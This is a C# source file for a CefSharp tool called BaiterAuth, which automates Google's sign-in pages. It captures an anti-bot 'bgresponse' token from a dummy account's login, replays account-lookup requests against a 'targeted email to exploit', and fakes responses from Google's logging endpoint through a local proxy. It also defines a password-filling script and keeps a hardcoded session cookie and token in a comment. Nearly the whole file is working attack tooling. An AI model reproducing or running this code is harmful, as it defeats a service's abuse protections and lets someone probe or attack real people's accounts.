using CefSharp;
using CefSharp.OffScreen;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Web;
using static Pet.RUIGoogle.GoogleConstants;

namespace Pet.RUIGoogle
{
    public class BaiterAuth
    {
        public ChromiumWebBrowser browser = null;
        RequestContext requestContext = null;
        QuickLocalWeb qlw = null;
        public Proxy autoResponder = null;

        ReusableAwaiter<object> reusableTCS = null;
        InterceptRequestHandler requestHandler = null;
        RequestIntercept interceptor = null;
        EventHandler<LoadingStateChangedEventArgs> lscTarget = null;

        GoogleAccountInfo gaInfo;

        static readonly string signinUrl = "https://accounts.google.com/";
        static readonly string serviceLogin_old = "https://accounts.google.com/ServiceLogin";
        static readonly string serviceLogin = "https://accounts.google.com/embedded/setup/v2";
        static readonly string lookupUri_old = "https://accounts.google.com/signin/v1/lookup";
        static readonly string lookupUri = "https://accounts.google.com/_/lookup/accountlookup";
        static readonly string logUri = "https://play.google.com/log?format=json&hasfast=true&authuser=0";
        static readonly string lookupScript = @"
            document.getElementById(""Email"").value = ""{0}"";
            document.getElementById(""next"").click();
        ";
        static readonly string lookupScriptNew = @"
            document.getElementById(""identifierId"").value = ""{0}"";
            document.getElementById(""identifierNext"").click();
        ";
        static readonly string signinScript = @"
            document.getElementById(""password"").value = ""{0}"";
            document.getElementById(""submit"").click();
        ";
        

        ICookieManager cookieManager = null;

        /// <summary>
        /// Cerate an instance of BaiterAuth
        /// </summary>
        /// <param name="gaInfo">Dummy account info used to get cookies</param>
        /// <returns></returns>
        public static async Task<BaiterAuth> Create(GoogleAccountInfo gaInfo/*, ChromiumWebBrowser browser*/)
        {
            BaiterAuth BA = new BaiterAuth
            {
                requestContext = new RequestContext(),
                qlw = new QuickLocalWeb(),
                autoResponder = new Proxy(),
                reusableTCS = new ReusableAwaiter<object>(),
                requestHandler = new InterceptRequestHandler(lookupUri),
                gaInfo = gaInfo
            };

            BA.interceptor =
                new RequestIntercept((object sender, RequestInterceptArgs e) =>
                {
                    Debug.WriteLine($"Intercepting accountlookup request");
                    if (!e.isRequest || !e.Request.Url.Contains(lookupUri)) return;

                    BA.reusableTCS.TrySetResult(e.Request);
                    Debug.WriteLine(e.Request.Url);
                    Debug.WriteLine("done");
                });
            //        BA.lscTarget =
            //new EventHandler<LoadingStateChangedEventArgs>(async (sender, args) =>
            //{
            //    //Wait for the Page to finish loading
            //    if (args.IsLoading == false)
            //    {
            //        BA.reusableTCS.TrySetResult(await BA.GetCookies());
            //        Debug.WriteLine("LoadingStateChanged invoked");
            //    }
            //});
            BA.lscTarget =
            new EventHandler<LoadingStateChangedEventArgs>((sender, args) =>
            {
        //Wait for the Page to finish loading
        if (args.IsLoading == false)
                {
                    BA.reusableTCS.TrySetResult(true);
                    Debug.WriteLine("LoadingStateChanged invoked");
                }
            });

            BA.browser = new ChromiumWebBrowser("localhost:" + BA.qlw.port, null, BA.requestContext);
            //BA.browser = browser;
            //var initialLoadResponse = await BA.browser.WaitForInitialLoadAsync();

            //if (!initialLoadResponse.Success)
            //{
            //    throw new Exception(string.Format("Page load failed with ErrorCode:{0}, HttpStatusCode:{1}", initialLoadResponse.ErrorCode, initialLoadResponse.HttpStatusCode));
            //}

            string proxyAddress = BA.autoResponder.Initialize();
            Debug.WriteLine("PROXY ADDRESS: " + proxyAddress);
            await SetProxy(BA.browser, proxyAddress);

            BA.cookieManager = BA.browser.GetCookieManager();
            BA.browser.RequestHandler = BA.requestHandler;

            Debug.WriteLine("LOADED");

            return BA;
        }

        public static Task SetProxy(IWebBrowser webBrowser, string address)
        {
            return Cef.UIThreadTaskFactory.StartNew(() =>
            {
                var context = webBrowser.GetBrowser().GetHost().RequestContext;

                context.SetPreference("proxy", new Dictionary<string, object>
                {
                    ["mode"] = "fixed_servers",
                    ["server"] = address
                }, out _);
            });
        }

        async Task<string> GetCookies()
        {
            if (cookieManager == null)
                throw new Exception("Can't get cookies. Browser is null.");

            TaskCookieVisitor tcv = new TaskCookieVisitor();
            cookieManager.VisitAllCookies(tcv);

            List<CefSharp.Cookie> cookieList = await tcv.Task;

            string cookies = "";
            foreach (CefSharp.Cookie cookie in cookieList)
                cookies += $"{cookie.Name}={cookie.Value}; ";
            cookies = cookies.Remove(cookies.Length - 2);

            return cookies;
        }

        private HttpResponseMessage RespondPOSTLog()
        {
            string HttpDate = DateTime.Now.ToUniversalTime().ToString("r");
            HttpResponseMessage response = new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = new StringContent(POSTlogBody),
                Version = HttpVersion.Version11
            };

            response.Headers.Add("Date", HttpDate);
            response.Content.Headers.Add("Expires", HttpDate);
            response.Content.Headers.Add("Content-Length", POSTlogBody.Length.ToString());

            HttpRequestMessageCrafter.UpdateHeaderTemplate(response, POSTlogTemplate);
            return response;
        }
        private HttpResponseMessage RespondOPTIONSLog()
        {
            string HttpDate = DateTime.Now.ToUniversalTime().ToString("r");
            HttpResponseMessage response = new HttpResponseMessage(HttpStatusCode.OK)
            {
                Version = HttpVersion.Version11
            };

            response.Headers.Add("Date", HttpDate);

            HttpRequestMessageCrafter.UpdateHeaderTemplate(response, OPTIONSlogTemplate);
            return response;
        }

        /// <summary>
        ///Capture accountlookup request without sending to the server. Browser must be on the ServiceLogin page
        /// </summary>
        /// <param name="email"></param>
        /// Email to get accountlookup request. The string's format is: "{insert_username}@gmail.com"
        /// <returns></returns>
        public async Task<LTRequest> AccountLookup(string email)
        {
            if (!browser.Address.StartsWith(serviceLogin_old))
                throw new Exception("Cannot capture accountlookup request. Browser is not on ServiceLogin");

            requestHandler.RequestIntercepted += interceptor;

            browser.ExecuteScriptAsync(string.Format(lookupScript, email));

            //Also resets the result (aka the LTRequest)
            await reusableTCS.Reset();
            requestHandler.RequestIntercepted -= interceptor;

            return (LTRequest)reusableTCS.GetResult();
        }
        public async Task<LTRequest> AccountLookupNew(string email)
        {
            Debug.WriteLine(browser.Address);
            if (!browser.Address.StartsWith(serviceLogin))
                throw new Exception("Cannot capture accountlookup request. Browser is not on ServiceLogin");

            requestHandler.RequestIntercepted += interceptor;

            Debug.WriteLine("executing script");
            browser.ExecuteScriptAsync(string.Format(lookupScriptNew, email));

            //Also resets the result (aka the LTRequest)
            await reusableTCS.Reset();
            requestHandler.RequestIntercepted -= interceptor;
            Debug.WriteLine("AccountLookup URL: " + browser.Address);
            return (LTRequest)reusableTCS.GetResult();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="gaInfo">Google account info for the dummy account detailing the username (without @gmail.com) and its password</param>
        /// <param name="targetEmail">Targeted email to exploit</param>
        /// <returns>A tuple of (targetEmailBgRequest, dummyHttpRequestMessage)</returns>
        public async Task<HttpRequestMessage> GetAccountLookupRequest(string targetEmail)
        {
            #region Abandon
            //To get entire request for the dummy email account for login
            //InterceptRequestHandler dummyRequest = new InterceptRequestHandler(lookupUri_old);
            //RequestIntercept dummyIntercept =
            //    new RequestIntercept((object sender, RequestInterceptArgs e) =>
            //    {
            //        Debug.WriteLine("Intercepting dummy email's accountlookup request");
            //        if (!e.isRequest) return;

            //        LTRequest request = e.Request;

            //        targetMessage = LTRequest.replicateRequest(request);
            //        HttpRequestMessageCrafter.UpdateHeaderTemplate(targetMessage, lookupHeaderTemplate);
            //        targetMessage.Headers.Add("Cookie", cookie);

            //        Debug.WriteLine("done");

            //        tcs.SetResult(true);
            //    });

            //dummyRequest.RequestIntercepted += dummyIntercept;

            //InterceptRequestHandler baitLookup = new InterceptRequestHandler(lookupUri_old);
            //RequestIntercept baitIntercept =
            //    new RequestIntercept((object sender, RequestInterceptArgs e) =>
            //{
            //    Debug.WriteLine("Getting target email's accountlookup bgRequest / bgResponse");
            //    if (!e.isRequest) return;

            //    LTRequest request = e.Request;

            //    string body = request.PostData.Elements[0].GetBody();
            //    Debug.WriteLine(body);
            //    NameValueCollection bodyQuery = HttpUtility.ParseQueryString(body);

            //    baitBgRequest = bodyQuery["bgresponse"];

            //    Debug.WriteLine(baitBgRequest);
            //    Debug.WriteLine(cookie);
            //    Debug.WriteLine("done");

            //    browser.RequestHandler = dummyRequest;
            //    browser.ExecuteScriptAsync(string.Format(lookupScript, gaInfo.username));
            //});

            //baitLookup.RequestIntercepted += baitIntercept;

            //        EventHandler<LoadingStateChangedEventArgs> lscTarget = new EventHandler<LoadingStateChangedEventArgs>((a, b) => { });
            //        lscTarget =
            //new EventHandler<LoadingStateChangedEventArgs>(async (sender, args) =>
            //{
            //                //Wait for the Page to finish loading
            //                if (args.IsLoading == false)
            //    {
            //        cookie = await GetCookies();

            //        browser.LoadingStateChanged -= lscTarget;
            //        browser.RequestHandler = baitLookup;
            //        browser.ExecuteScriptAsync(string.Format(lookupScript, targetEmail));
            //    }
            //});
            #endregion

            browser.LoadingStateChanged += lscTarget;
            browser.Load(signinUrl);
            await reusableTCS.Reset();
            string cookie = (string)reusableTCS.GetResult();
            Debug.WriteLine("COOKIE: " + cookie);

            browser.LoadingStateChanged -= lscTarget;

            LTRequest baitRequest = await AccountLookup(gaInfo.username);
            string body = baitRequest.PostData.Elements[0].GetBody();
            Debug.WriteLine(body);
            NameValueCollection bodyQuery = HttpUtility.ParseQueryString(body);
            string baitBgRequest = bodyQuery["bgresponse"];
            Debug.WriteLine("BGRESPONSE: " + baitBgRequest);

            LTRequest dummyRequest = await AccountLookup(targetEmail);
            //LTRequest.Serialize(dummyRequest, @"D:\SerializedRequest.lt");

            //LTRequest dummyRequest = LTRequest.Deserialize(@"D:\SerializedRequest.lt");
            //string cookie = "__Host-GAPS=1:1nTPAI3YH95hramAzSKZFudqSPeoZw:lJIkwuC_kXoYfF5f";
            //string baitBgRequest = "<Y69qr-ICAAYHRSqYJ0WNf3R9wtWKirT0ACkAIwj8RkSpyQ2wi5H3JIJPANK3eGmfBaRgOSiEVf6wqXVEIFtHEXTzx80AAADpnQAAAGunAQdWAuWcV0V4IBhtNUSGyAV0aNGUlt2MffIfdE6Tb9WkJAG51vjjZts4wpj4yxaQOaKNXOIC_qVXOnr6xS51AzbAQ6dtU6UR0DC8I3i3KNEVJjEGhfqn4oBcaVoVhMELPSgpR48N55XDJapOdKZyrrhByhZAfXLbtpb_iJ1yQ-T5Vd4JR-xb39k-RvRm7D8gFiTw8xqpiPGFawwO3ZYT3pDVc06RM76MIIINwx3PvprHed8a3pG6IfbTMZ4eitvtWDS7bdnV-os_l56zwnkK0nHz4ZtZonjuyoZ9fqzlEvZVW5gPU5-yxjUKniepuyqE0vGSeOLzy3zHhLID99HTHFnrjutLJf4msYn5zYvRAuz_NGoICwHnA2ddj7dnTQpJhmZ1l5TRfRH9BeJuJ7uQpS1C4RS2epmmabb11xsCHK4QxaaTGyP5pLGakO5c3Iqr8vvApoOJuqEdu5PWZ-urK0FXvBHu03iI5asm4S9DeLHPhJjpNjhjjdQpmjrLpwCs9dOFe-ymPBCnw5JqNffspDErBXr8AyHCVE_C3mR_nogRXoU5lvMbK0EWX5FrEeNjClCNWmjIxcRH0UqCS_-DPcGCCpiQhhJCT0FBbRLCZbaSluShlr3UIR47-w9DtugkbJ7vUmylSsldJpI6zkNrZstMws3ousB_Q_yXu6HYJY_7UejGJ3K4l_nBfGX_9flAAO0hh2HPcTvLJm6QAGvZzOeUVROLnp1MfpS7eeaWKtY2EzaGxUysIIvcJ4FwPVZvTXvrKnUZp_dnevSxzQnVVYtimvtD7vWNJ6kcY-UlpNaM3s_KMoOH1nDlhAr6xZX8sxbifJc5CPKjJ2lcNtedK56nCiVUxDBkLbu1rhwFgsZgh-8SKr2bkWVJ8kbnXU15YAk6nWeosWWQPYgfXBKI5LZUQIYis3opwIyNTdfsOpA9_sjPvapzPqX2g--FjuvMMM0M0nNe9CKhBGqZ52AG7XeBX6jfeUo_9wc";

            Debug.WriteLine("Replicating Request");
            HttpRequestMessage targetMessage = LTRequest.ReplicateRequest(dummyRequest);
            Debug.WriteLine("Replicating Request Done!");
            Debug.WriteLine("Updating Header");
            HttpRequestMessageCrafter.UpdateHeaderTemplate(targetMessage, lookupHeaderTemplate);
            Debug.WriteLine("Updating Header Done!");
            targetMessage.Headers.Add("Cookie", cookie);
            Debug.WriteLine("IMPORTANT: " + targetMessage.Headers.GetValues("Cookie").First());

            Debug.WriteLine("bgRequest and targetMessage acquired!");
            return targetMessage;
        }
        public async Task<string> GetBgRequest(string targetEmail)
        {
            browser.LoadingStateChanged += lscTarget;
            browser.Load(signinUrl);
            await reusableTCS.Reset();
            string cookie = (string)reusableTCS.GetResult();
            Debug.WriteLine("COOKIE: " + cookie);

            browser.LoadingStateChanged -= lscTarget;

            LTRequest baitRequest = await AccountLookup(gaInfo.username);
            string body = baitRequest.PostData.Elements[0].GetBody();
            Debug.WriteLine(body);
            NameValueCollection bodyQuery = HttpUtility.ParseQueryString(body);
            string baitBgRequest = bodyQuery["bgresponse"];
            Debug.WriteLine("BGRESPONSE: " + baitBgRequest);
            Debug.WriteLine("bgRequest and acquired!");
            return baitBgRequest;
        }
        public async Task<HttpRequestMessage> GetAccountLookupRequest(string targetEmail, params HttpResponseMessage[] responses)
        {
            //requestHandler.uriBlock.Add("https://accounts.google.com/_/lookup/accountlookup");
            browser.LoadingStateChanged += lscTarget;

            autoResponder.RegisterResponse(
                (req) => req.Url == logUri && req.Method == "OPTIONS",
                RespondOPTIONSLog());

            autoResponder.RegisterResponse(
                (req) => req.Url == logUri && req.Method == "POST",
                RespondPOSTLog());

            foreach (HttpResponseMessage response in responses)
            {
                //requestHandler.uriBlock.Add(response.url);
                //browser.RegisterResourceHandler(response.url, new MemoryStream(response.data), response.mimeType, true);
                autoResponder.RegisterResponse((req) => 
                req.Url == response.RequestMessage.RequestUri.AbsoluteUri,
                response, true);
                browser.Load(response.RequestMessage.RequestUri.AbsoluteUri);
                await reusableTCS.Reset();
                Debug.WriteLine("url: " + response.RequestMessage.RequestUri.AbsoluteUri);
            }
            browser.LoadingStateChanged -= lscTarget;
            LTRequest baitRequest = await AccountLookupNew(targetEmail);
            Debug.WriteLine("Replicating Request");
            HttpRequestMessage result = LTRequest.ReplicateRequest(baitRequest);
            //Remove User-Agent because the generated accountlookup User-Agent has the wrong User-Agent from the browser
            result.Headers.Remove("User-Agent");
            Debug.WriteLine("Updating Header Done!");
            HttpRequestMessageCrafter.UpdateHeaderTemplate(result, accountlookupTemplate);
            //HARD-CODED ?TODO: Accept-Language header differs probably due to different browser settings
            result.Headers.Remove("Accept-Language");
            result.Headers.Add("Accept-Language", "en-us");
            return result;
        }
    }
}
